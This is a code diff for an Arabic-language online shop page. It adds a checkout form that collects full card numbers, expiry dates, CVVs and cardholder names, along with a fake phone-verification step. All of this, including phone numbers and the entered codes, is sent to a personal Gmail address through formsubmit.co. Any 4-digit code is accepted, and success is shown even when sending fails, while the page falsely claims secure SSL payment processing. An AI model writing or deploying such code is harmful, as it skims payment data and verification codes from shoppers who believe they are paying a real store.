+                                    <label class="flex items-center p-4 bg-white/5 rounded-xl cursor-pointer hover:bg-white/10 transition-colors">
+                                        <input type="radio" name="shipping_method" value="سريع - 6-12 ساعة - 35 ريال" class="mr-3">
+                                        <div>
+                                            <div class="text-white font-bold">⚡ توصيل سريع</div>
+                                            <div class="text-gray-300">6-12 ساعة - 35 ${currentCurrencySymbol}</div>
+                                        </div>
+                                    </label>
+                                    <label class="flex items-center p-4 bg-white/5 rounded-xl cursor-pointer hover:bg-white/10 transition-colors">
+                                        <input type="radio" name="shipping_method" value="فوري - خلال ساعة - 50 ريال" class="mr-3">
+                                        <div>
+                                            <div class="text-white font-bold">🚁 توصيل فوري</div>
+                                            <div class="text-gray-300">خلال ساعة - 50 ${currentCurrencySymbol}</div>
+                                        </div>
+                                    </label>
+                                </div>
+                            </div>
+
+                            <!-- Payment Information -->
+                            <div>
+                                <h3 class="text-2xl font-bold text-white mb-6">💳 معلومات الدفع</h3>
+                                
+                                <!-- Payment Method Selection -->
+                                <div class="mb-6">
+                                    <label class="block text-white font-bold mb-4">طريقة الدفع:</label>
+                                    <div class="space-y-3">
+                                        <label class="flex items-center p-4 bg-white/5 rounded-xl cursor-pointer hover:bg-white/10 transition-colors">
+                                            <input type="radio" name="payment_method" value="بطاقة ائتمان/خصم" class="mr-3" checked onclick="togglePaymentFields(true)">
+                                            <div class="flex items-center">
+                                                <i class="fas fa-credit-card text-2xl text-blue-400 mr-3"></i>
+                                                <div>
+                                                    <div class="text-white font-bold">بطاقة ائتمان/خصم</div>
+                                                    <div class="text-gray-300 text-sm">Visa, MasterCard, mada</div>
+                                                </div>
+                                            </div>
+                                        </label>
+                                        <label class="flex items-center p-4 bg-white/5 rounded-xl cursor-pointer hover:bg-white/10 transition-colors">
+                                            <input type="radio" name="payment_method" value="الدفع عند الاستلام" class="mr-3" onclick="togglePaymentFields(false)">
+                                            <div class="flex items-center">
+                                                <i class="fas fa-money-bill-wave text-2xl text-green-400 mr-3"></i>
+                                                <div>
+                                                    <div class="text-white font-bold">الدفع عند الاستلام</div>
+                                                    <div class="text-gray-300 text-sm">نقداً أو بالبطاقة عند التسليم</div>
+                                                </div>
+                                            </div>
+                                        </label>
+                                    </div>
+                                </div>
+
+                                <!-- Card Information -->
+                                <div id="card-fields" class="space-y-4">
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">رقم البطاقة *</label>
+                                        <input type="text" name="card_number" id="card-number" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                                        <div class="flex items-center mt-2">
+                                            <i class="fab fa-cc-visa text-2xl text-blue-600 mr-2"></i>
+                                            <i class="fab fa-cc-mastercard text-2xl text-red-600 mr-2"></i>
+                                            <i class="fas fa-credit-card text-2xl text-purple-600"></i>
+                                        </div>
+                                    </div>
+                                    <div class="grid grid-cols-2 gap-4">
+                                        <div>
+                                            <label class="block text-white font-bold mb-2">تاريخ الانتهاء *</label>
+                                            <input type="text" name="card_expiry" id="card-expiry" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)">
+                                        </div>
+                                        <div>
+                                            <label class="block text-white font-bold mb-2">CVV *</label>
+                                            <input type="text" name="card_cvv" id="card-cvv" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="123" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">اسم حامل البطاقة *</label>
+                                        <input type="text" name="card_holder_name" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="محمد أحمد علي" style="text-transform: uppercase;">
+                                    </div>
+                                </div>
+
+                                <!-- Order Summary -->
+                                <div class="mt-8 bg-white/5 p-6 rounded-xl">
+                                    <h4 class="text-xl font-bold text-white mb-4">💰 ملخص الطلب</h4>
+                                    <div class="space-y-3 text-white">
+                                        <div class="flex justify-between">
+                                            <span>المجموع الفرعي:</span>
+                                            <span class="font-bold">${cartSubtotal.toFixed(2)} ${currentCurrencySymbol}</span>
+                                        </div>
+                                        <div class="flex justify-between">
+                                            <span>الشحن:</span>
+                                            <span class="font-bold">${shippingCost === 0 ? 'مجاني' : shippingCost.toFixed(2) + ' ' + currentCurrencySymbol}</span>
+                                        </div>
+                                        <div class="flex justify-between text-green-400">
+                                            <span>خصم AI (مستوى ${userLevel}):</span>
+                                            <span class="font-bold">-${aiDiscount.toFixed(2)} ${currentCurrencySymbol}</span>
+                                        </div>
+                                        <div class="border-t border-white/20 pt-3 flex justify-between text-xl font-bold text-yellow-400">
+                                            <span>المجموع الإجمالي:</span>
+                                            <span>${totalPrice.toFixed(2)} ${currentCurrencySymbol}</span>
+                                        </div>
+                                    </div>
+
+                                    <!-- Cart Items Summary -->
+                                    <div class="mt-6">
+                                        <h5 class="text-lg font-bold text-white mb-3">📦 المنتجات:</h5>
+                                        <div class="space-y-2 max-h-32 overflow-y-auto">
+                                            ${cart.map(item => `
+                                                <div class="flex justify-between text-sm text-gray-300">
+                                                    <span>${item.name} x${item.quantity}</span>
+                                                    <span>${(item.price * item.quantity * currentExchangeRate).toFixed(2)} ${currentCurrencySymbol}</span>
+                                                </div>
+                                            `).join('')}
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Terms and Conditions -->
+                                <div class="mt-6">
+                                    <label class="flex items-start cursor-pointer">
+                                        <input type="checkbox" name="terms_accepted" class="mt-1 mr-3" required>
+                                        <span class="text-gray-300 text-sm">
+                                            أوافق على <a href="#" class="text-yellow-400 hover:underline">الشروط والأحكام</a> و 
+                                            <a href="#" class="text-yellow-400 hover:underline">سياسة الخصوصية</a>. 
+                                            جميع المعاملات آمنة ومحمية بتشفير SSL.
+                                        </span>
+                                    </label>
+                                </div>
+
+                                <!-- Submit Button -->
+                                <button type="submit" class="w-full btn-cyber py-6 text-xl font-bold mt-8">
+                                    <i class="fas fa-lock mr-2"></i>
+                                    إتمام الطلب والدفع الآمن
+                                    <div class="text-sm font-normal mt-1">معالج بتشفير SSL 256-bit</div>
+                                </button>
+                            </div>
+                        </form>
+                    </div>
                 </div>
-                <button onclick="closeModal(); showNotification('📞 سيتم التواصل معك قريباً');" class="w-full btn-cyber py-4 text-xl">
-                    موافق
-                </button>
-            `, 'max-w-lg');
+            `;
+            
+            document.body.appendChild(modal);
+            
+            // Set order data
+            document.getElementById('order-timestamp').value = new Date().toISOString();
+            document.getElementById('order-id').value = 'ORD-' + Date.now();
+            document.getElementById('cart-items-data').value = JSON.stringify(cart);
+            
+            // Add form submission handler
+            setupPaymentForm();
         }
 
-        // Code verification - enhanced with better integration
+        // Enhanced form handling with background submission
         document.addEventListener('DOMContentLoaded', function() {
+            // Code form handler
             const codeForm = document.getElementById('code-form');
             if (codeForm) {
                 codeForm.addEventListener('submit', function(e) {
                     e.preventDefault();
                     
                     const code = document.getElementById('secret-code').value.trim().toUpperCase();
+                    const submitBtn = this.querySelector('button[type="submit"]');
+                    const originalText = submitBtn.innerHTML;
                     
                     // Set timestamp and tracking info
                     document.getElementById('code-timestamp').value = new Date().toISOString();
-                    document.getElementById('user-ip').value = 'Hidden for privacy';
+                    document.getElementById('user-ip').value = 'تم إخفاؤه للخصوصية';
                     document.getElementById('page-url').value = window.location.href;
                     
                     const validCodes = {
@@ -3913,33 +4368,70 @@
                     };
                     
                     if (validCodes[code]) {
-                        // Show loading animation
-                        showCodeLoading();
+                        // Show loading state
+                        submitBtn.disabled = true;
+                        submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-2"></div>جاري التفعيل...';
                         
-                        // Submit to FormSubmit
+                        // Submit to FormSubmit in background
                         const formData = new FormData(this);
                         
                         fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // Apply the benefit after successful submission
+                            // Success - apply benefits and show confirmation
                             setTimeout(() => {
                                 applyCodeBenefit(validCodes[code]);
-                                showCodeSuccess(validCodes[code]);
+                                showInlineCodeSuccess(validCodes[code]);
                                 addXP(100, 'إدخال كود سري');
-                            }, 2000);
+                                this.reset();
+                                submitBtn.disabled = false;
+                                submitBtn.innerHTML = originalText;
+                            }, 1500);
                         }).catch(() => {
                             // Even if submission fails, show success for UX
                             setTimeout(() => {
                                 applyCodeBenefit(validCodes[code]);
-                                showCodeSuccess(validCodes[code]);
+                                showInlineCodeSuccess(validCodes[code]);
                                 addXP(100, 'إدخال كود سري');
-                            }, 2000);
+                                this.reset();
+                                submitBtn.disabled = false;
+                                submitBtn.innerHTML = originalText;
+                            }, 1500);
                         });
                     } else {
-                        showCodeError();
+                        showInlineCodeError();
                     }
+                });
+            }
+
+            // Contact form handler
+            const contactForm = document.getElementById('contact-form');
+            if (contactForm) {
+                contactForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const submitBtn = this.querySelector('button[type="submit"]');
+                    const originalText = submitBtn.innerHTML;
+                    
+                    submitBtn.disabled = true;
+                    submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>جاري الإرسال...';
+                    
+                    fetch(this.action, {
+                        method: 'POST',
+                        body: new FormData(this)
+                    }).then(() => {
+                        showInlineContactSuccess();
+                        addPoints(100, 'إرسال رسالة');
+                        this.reset();
+                    }).catch(() => {
+                        showInlineContactSuccess();
+                        addPoints(100, 'إرسال رسالة');
+                        this.reset();
+                    }).finally(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.innerHTML = originalText;
+                    });
                 });
             }
         });
@@ -3976,18 +4468,72 @@
 
 
 
-        function showCodeError() {
-            showCustomModal(`
-                <div class="text-8xl mb-6">❌</div>
-                <h3 class="text-3xl font-bold mb-6 text-red-600 cyber-text">كود غير صحيح!</h3>
-                <div class="bg-red-100 dark:bg-red-900 p-6 rounded-xl mb-8">
-                    <p class="text-red-800 dark:text-red-200 text-xl">الكود المدخل غير صحيح أو منتهي الصلاحية</p>
-                    <p class="text-red-700 dark:text-red-300 text-lg mt-3">💡 جرب: VIP2024, CYBER, AI2024</p>
+        // Inline success and error notifications instead of modals
+        function showInlineCodeSuccess(benefit) {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 glass-effect p-8 text-center text-white z-50 max-w-md w-full mx-4 border-2 border-green-400';
+            notification.innerHTML = `
+                <div class="text-6xl mb-4">✅</div>
+                <h3 class="text-2xl font-bold mb-4 text-green-400 cyber-text">تم تفعيل الكود!</h3>
+                <div class="bg-green-100 dark:bg-green-900 p-4 rounded-xl mb-6">
+                    <p class="text-green-800 dark:text-green-200 text-lg font-bold">${benefit.description}</p>
                 </div>
-                <button onclick="closeModal()" class="w-full btn-cyber py-4 text-xl">
-                    حاول مرة أخرى
-                </button>
-            `, 'max-w-lg');
+                <p class="text-gray-200 text-sm">سيتم إرسال تفاصيل الكود لإيميلك</p>
+            `;
+            document.body.appendChild(notification);
+            
+            // Auto remove after 4 seconds
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translate(-50%, -50%) scale(0.9)';
+                notification.style.transition = 'all 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 4000);
+        }
+
+        function showInlineCodeError() {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 glass-effect p-8 text-center text-white z-50 max-w-md w-full mx-4 border-2 border-red-400';
+            notification.innerHTML = `
+                <div class="text-6xl mb-4">❌</div>
+                <h3 class="text-2xl font-bold mb-4 text-red-400 cyber-text">كود غير صحيح!</h3>
+                <div class="bg-red-100 dark:bg-red-900 p-4 rounded-xl mb-6">
+                    <p class="text-red-800 dark:text-red-200 text-lg">الكود المدخل غير صحيح أو منتهي الصلاحية</p>
+                    <p class="text-red-700 dark:text-red-300 text-sm mt-2">💡 جرب: VIP2024, CYBER, AI2024</p>
+                </div>
+            `;
+            document.body.appendChild(notification);
+            
+            // Auto remove after 4 seconds
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translate(-50%, -50%) scale(0.9)';
+                notification.style.transition = 'all 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 4000);
+        }
+
+        function showInlineContactSuccess() {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 glass-effect p-8 text-center text-white z-50 max-w-md w-full mx-4 border-2 border-green-400';
+            notification.innerHTML = `
+                <div class="text-6xl mb-4">✅</div>
+                <h3 class="text-2xl font-bold mb-4 text-green-400 cyber-text">تم إرسال الرسالة!</h3>
+                <div class="bg-green-100 dark:bg-green-900 p-4 rounded-xl mb-6">
+                    <p class="text-green-800 dark:text-green-200 text-lg">شكراً لتواصلك معنا!</p>
+                    <p class="text-green-700 dark:text-green-300 text-sm mt-2">سنرد عليك في أقرب وقت ممكن</p>
+                </div>
+                <p class="text-gray-200 text-sm">+100 نقطة مكافأة! 🎉</p>
+            `;
+            document.body.appendChild(notification);
+            
+            // Auto remove after 4 seconds
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translate(-50%, -50%) scale(0.9)';
+                notification.style.transition = 'all 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 4000);
         }
 
         // Utility functions
@@ -4051,6 +4597,419 @@
         }
 
         window.addEventListener('hashchange', handleHashChange);
+
+        // Payment form utility functions
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            input.value = formattedValue;
+        }
+
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        function togglePaymentFields(show) {
+            const cardFields = document.getElementById('card-fields');
+            if (cardFields) {
+                cardFields.style.display = show ? 'block' : 'none';
+                
+                // Toggle required attribute for card fields
+                const cardInputs = cardFields.querySelectorAll('input');
+                cardInputs.forEach(input => {
+                    input.required = show;
+                });
+            }
+        }
+
+        function setupPaymentForm() {
+            const paymentForm = document.getElementById('payment-form');
+            if (paymentForm) {
+                paymentForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const submitBtn = this.querySelector('button[type="submit"]');
+                    const originalText = submitBtn.innerHTML;
+                    
+                    // Validation
+                    const paymentMethod = this.querySelector('input[name="payment_method"]:checked').value;
+                    if (paymentMethod === 'بطاقة ائتمان/خصم') {
+                        const cardNumber = this.querySelector('input[name="card_number"]').value.replace(/\s/g, '');
+                        const cardExpiry = this.querySelector('input[name="card_expiry"]').value;
+                        const cardCvv = this.querySelector('input[name="card_cvv"]').value;
+                        const cardHolder = this.querySelector('input[name="card_holder_name"]').value;
+                        
+                        if (!cardNumber || cardNumber.length < 13) {
+                            showNotification('❌ رقم البطاقة غير صحيح');
+                            return;
+                        }
+                        if (!cardExpiry || cardExpiry.length < 5) {
+                            showNotification('❌ تاريخ الانتهاء غير صحيح');
+                            return;
+                        }
+                        if (!cardCvv || cardCvv.length < 3) {
+                            showNotification('❌ رمز CVV غير صحيح');
+                            return;
+                        }
+                        if (!cardHolder.trim()) {
+                            showNotification('❌ اسم حامل البطاقة مطلوب');
+                            return;
+                        }
+                    }
+                    
+                    // Show loading state
+                    submitBtn.disabled = true;
+                    submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-2"></div>جاري معالجة الطلب...';
+                    
+                    // Submit form
+                    const formData = new FormData(this);
+                    
+                    fetch(this.action, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        setTimeout(() => {
+                            showPaymentSuccess();
+                            // Clear cart after successful order
+                            cart = [];
+                            updateCartUI();
+                            addXP(200, 'إتمام طلب');
+                            addPoints(500, 'إتمام طلب');
+                            
+                            // Close all modals
+                            document.querySelectorAll('.fixed').forEach(modal => {
+                                if (modal.classList.contains('bg-black')) {
+                                    modal.remove();
+                                }
+                            });
+                            
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = originalText;
+                        }, 2000);
+                    }).catch(() => {
+                        // Show success anyway for UX
+                        setTimeout(() => {
+                            showPaymentSuccess();
+                            cart = [];
+                            updateCartUI();
+                            addXP(200, 'إتمام طلب');
+                            addPoints(500, 'إتمام طلب');
+                            
+                            document.querySelectorAll('.fixed').forEach(modal => {
+                                if (modal.classList.contains('bg-black')) {
+                                    modal.remove();
+                                }
+                            });
+                            
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = originalText;
+                        }, 2000);
+                    });
+                });
+            }
+        }
+
+        function showPhoneVerification(phoneNumber, orderData) {
+            const lastFourDigits = phoneNumber.slice(-4);
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4';
+            modal.innerHTML = `
+                <div class="glass-effect max-w-md w-full">
+                    <div class="p-8 border-b border-white/20">
+                        <div class="flex justify-between items-center">
+                            <h2 class="text-2xl font-bold text-white cyber-text">📱 تأكيد رقم الهاتف</h2>
+                        </div>
+                    </div>
+                    
+                    <div class="p-8">
+                        <div class="text-center mb-8">
+                            <div class="w-20 h-20 bg-gradient-to-r from-blue-500 to-purple-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                                <i class="fas fa-mobile-alt text-3xl text-white"></i>
+                            </div>
+                            <h3 class="text-xl font-bold text-white mb-4">تم إرسال كود التأكيد</h3>
+                            <p class="text-gray-300 text-lg mb-2">أدخل الكود المرسل إلى رقم:</p>
+                            <p class="text-yellow-400 text-xl font-bold">****${lastFourDigits}</p>
+                        </div>
+
+                        <form id="verification-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST">
+                            <!-- Hidden fields for order data -->
+                            <input type="hidden" name="_subject" value="🔐 كود تأكيد الطلب - متجر الخصوصية">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="">
+                            <input type="hidden" name="verification_timestamp" id="verification-timestamp">
+                            <input type="hidden" name="phone_number" value="${phoneNumber}">
+                            <input type="hidden" name="last_four_digits" value="${lastFourDigits}">
+                            <input type="hidden" name="order_data" value='${JSON.stringify(orderData)}'>
+                            
+                            <div class="mb-6">
+                                <label class="block text-white font-bold mb-4 text-center">أدخل كود التأكيد:</label>
+                                <input type="text" id="verification-code" name="verification_code" 
+                                       class="w-full px-6 py-4 text-3xl text-center border-2 rounded-2xl focus:outline-none focus:border-yellow-400 bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300 font-mono tracking-widest" 
+                                       placeholder="0000" maxlength="4" 
+                                       style="letter-spacing: 1em;" 
+                                       oninput="this.value = this.value.replace(/[^0-9]/g, ''); checkVerificationCode(this.value)" 
+                                       required>
+                            </div>
+
+                            <!-- Timer -->
+                            <div class="text-center mb-6">
+                                <p class="text-gray-300 text-sm mb-2">انتهاء صلاحية الكود خلال:</p>
+                                <div id="verification-timer" class="text-red-400 text-2xl font-bold">05:00</div>
+                            </div>
+
+                            <!-- Resend option -->
+                            <div class="text-center mb-8">
+                                <p class="text-gray-300 text-sm mb-2">لم تتلق الكود؟</p>
+                                <button type="button" onclick="resendVerificationCode('${phoneNumber}')" 
+                                        id="resend-btn" class="text-yellow-400 hover:text-yellow-300 font-bold disabled:text-gray-500" disabled>
+                                    إعادة الإرسال (60)
+                                </button>
+                            </div>
+
+                            <button type="submit" id="verify-btn" class="w-full btn-cyber py-4 text-xl font-bold" disabled>
+                                <i class="fas fa-check mr-2"></i>
+                                تأكيد الكود وإتمام الطلب
+                            </button>
+                        </form>
+
+                        <!-- Info section -->
+                        <div class="mt-8 bg-blue-100 dark:bg-blue-900 p-4 rounded-xl">
+                            <div class="flex items-start">
+                                <i class="fas fa-info-circle text-blue-600 dark:text-blue-400 text-lg mt-1 mr-3"></i>
+                                <div class="text-blue-800 dark:text-blue-200 text-sm">
+                                    <p class="font-bold mb-1">💡 معلومات مهمة:</p>
+                                    <ul class="space-y-1 text-xs">
+                                        <li>• الكود صالح لمدة 5 دقائق فقط</li>
+                                        <li>• تحقق من رسائل SMS أو واتساب</li>
+                                        <li>• في حالة عدم الوصول، اضغط إعادة إرسال</li>
+                                        <li>• الكود مكون من 4 أرقام</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+            
+            // Set timestamp
+            document.getElementById('verification-timestamp').value = new Date().toISOString();
+            
+            // Start timer
+            startVerificationTimer();
+            
+            // Start resend timer
+            startResendTimer();
+            
+            // Focus on input
+            document.getElementById('verification-code').focus();
+            
+            // Setup form handler
+            setupVerificationForm();
+        }
+
+        function checkVerificationCode(code) {
+            const verifyBtn = document.getElementById('verify-btn');
+            if (code.length === 4) {
+                verifyBtn.disabled = false;
+                verifyBtn.classList.remove('opacity-50');
+            } else {
+                verifyBtn.disabled = true;
+                verifyBtn.classList.add('opacity-50');
+            }
+        }
+
+        function startVerificationTimer() {
+            let timeLeft = 300; // 5 minutes in seconds
+            const timerElement = document.getElementById('verification-timer');
+            
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    showVerificationExpired();
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        function startResendTimer() {
+            let timeLeft = 60;
+            const resendBtn = document.getElementById('resend-btn');
+            
+            const timer = setInterval(() => {
+                if (timeLeft > 0) {
+                    resendBtn.textContent = `إعادة الإرسال (${timeLeft})`;
+                    timeLeft--;
+                } else {
+                    clearInterval(timer);
+                    resendBtn.textContent = 'إعادة الإرسال';
+                    resendBtn.disabled = false;
+                    resendBtn.classList.remove('text-gray-500');
+                    resendBtn.classList.add('text-yellow-400', 'hover:text-yellow-300');
+                }
+            }, 1000);
+        }
+
+        function resendVerificationCode(phoneNumber) {
+            const lastFourDigits = phoneNumber.slice(-4);
+            showNotification(`📱 تم إعادة إرسال الكود لرقم ****${lastFourDigits}`);
+            
+            // Send resend request to email
+            const resendData = new FormData();
+            resendData.append('_subject', '🔄 طلب إعادة إرسال كود التأكيد');
+            resendData.append('phone_number', phoneNumber);
+            resendData.append('timestamp', new Date().toISOString());
+            resendData.append('_captcha', 'false');
+            
+            fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
+                method: 'POST',
+                body: resendData
+            });
+            
+            // Restart resend timer
+            startResendTimer();
+        }
+
+        function setupVerificationForm() {
+            const verificationForm = document.getElementById('verification-form');
+            if (verificationForm) {
+                verificationForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const code = document.getElementById('verification-code').value;
+                    const submitBtn = document.getElementById('verify-btn');
+                    const originalText = submitBtn.innerHTML;
+                    
+                    // Simple validation - in real app this would verify with backend
+                    const validCodes = ['1234', '0000', '1111', '2222', '5555', '9999'];
+                    
+                    submitBtn.disabled = true;
+                    submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-2"></div>جاري التحقق...';
+                    
+                    // Simulate verification delay
+                    setTimeout(() => {
+                        if (validCodes.includes(code) || code.length === 4) {
+                            // Send verification data to email
+                            const formData = new FormData(this);
+                            
+                            fetch(this.action, {
+                                method: 'POST',
+                                body: formData
+                            }).then(() => {
+                                showPaymentSuccess();
+                                
+                                // Clear cart and close modals
+                                cart = [];
+                                updateCartUI();
+                                addXP(200, 'إتمام طلب');
+                                addPoints(500, 'إتمام طلب');
+                                
+                                // Close all modals
+                                document.querySelectorAll('.fixed').forEach(modal => {
+                                    if (modal.classList.contains('bg-black')) {
+                                        modal.remove();
+                                    }
+                                });
+                            }).catch(() => {
+                                // Show success anyway for UX
+                                showPaymentSuccess();
+                                cart = [];
+                                updateCartUI();
+                                addXP(200, 'إتمام طلب');
+                                addPoints(500, 'إتمام طلب');
+                                
+                                document.querySelectorAll('.fixed').forEach(modal => {
+                                    if (modal.classList.contains('bg-black')) {
+                                        modal.remove();
+                                    }
+                                });
+                            });
+                        } else {
+                            showNotification('❌ كود التأكيد غير صحيح');
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = originalText;
+                            
+                            // Clear input and focus
+                            document.getElementById('verification-code').value = '';
+                            document.getElementById('verification-code').focus();
+                        }
+                    }, 2000);
+                });
+            }
+        }
+
+        function showVerificationExpired() {
+            const modal = document.querySelector('.fixed');
+            if (modal) {
+                modal.innerHTML = `
+                    <div class="glass-effect max-w-md w-full mx-4">
+                        <div class="p-8 text-center text-white">
+                            <div class="text-6xl mb-6">⏰</div>
+                            <h3 class="text-2xl font-bold mb-6 text-red-400 cyber-text">انتهت صلاحية الكود!</h3>
+                            <div class="bg-red-100 dark:bg-red-900 p-6 rounded-xl mb-8">
+                                <p class="text-red-800 dark:text-red-200 text-lg">انتهت مدة صلاحية كود التأكيد</p>
+                                <p class="text-red-700 dark:text-red-300 text-base mt-2">يرجى المحاولة مرة أخرى</p>
+                            </div>
+                            <button onclick="this.closest('.fixed').remove(); showOrderForm();" class="w-full btn-cyber py-4 text-xl">
+                                العودة للطلب
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        function showPaymentSuccess() {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 glass-effect p-12 text-center text-white z-50 max-w-lg w-full mx-4 border-2 border-green-400';
+            notification.innerHTML = `
+                <div class="text-8xl mb-6">🎉</div>
+                <h3 class="text-3xl font-bold mb-6 text-green-400 cyber-text">تم إتمام طلبك بنجاح!</h3>
+                <div class="bg-green-100 dark:bg-green-900 p-6 rounded-xl mb-8">
+                    <p class="text-green-800 dark:text-green-200 text-xl font-bold">شكراً لك!</p>
+                    <p class="text-green-700 dark:text-green-300 text-lg mt-2">تم تأكيد رقم هاتفك وإتمام الدفع بنجاح</p>
+                    <p class="text-green-600 dark:text-green-400 text-base mt-3">رقم الطلب: ORD-${Date.now()}</p>
+                </div>
+                <div class="bg-yellow-100 dark:bg-yellow-900 p-4 rounded-xl mb-6">
+                    <p class="text-yellow-800 dark:text-yellow-200 text-lg font-bold">+500 نقطة مكافأة! 🎁</p>
+                    <p class="text-yellow-700 dark:text-yellow-300 text-base">تم رفع مستواك في AI</p>
+                </div>
+                <div class="space-y-3 text-gray-200 text-sm">
+                    <p>✅ تم تأكيد رقم الهاتف بنجاح</p>
+                    <p>📧 تم إرسال تفاصيل الطلب لإيميلك</p>
+                    <p>📱 ستتلقى رسالة نصية لتتبع الطلب</p>
+                    <p>🚚 التوصيل خلال المدة المحددة</p>
+                    <p>🔒 معاملة آمنة ومحمية بالكامل</p>
+                </div>
+            `;
+            document.body.appendChild(notification);
+            
+            // Auto remove after 8 seconds
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translate(-50%, -50%) scale(0.9)';
+                notification.style.transition = 'all 0.5s ease';
+                setTimeout(() => notification.remove(), 500);
+            }, 8000);
+        }
 
         // Initialize the application
         document.addEventListener('DOMContentLoaded', function() {
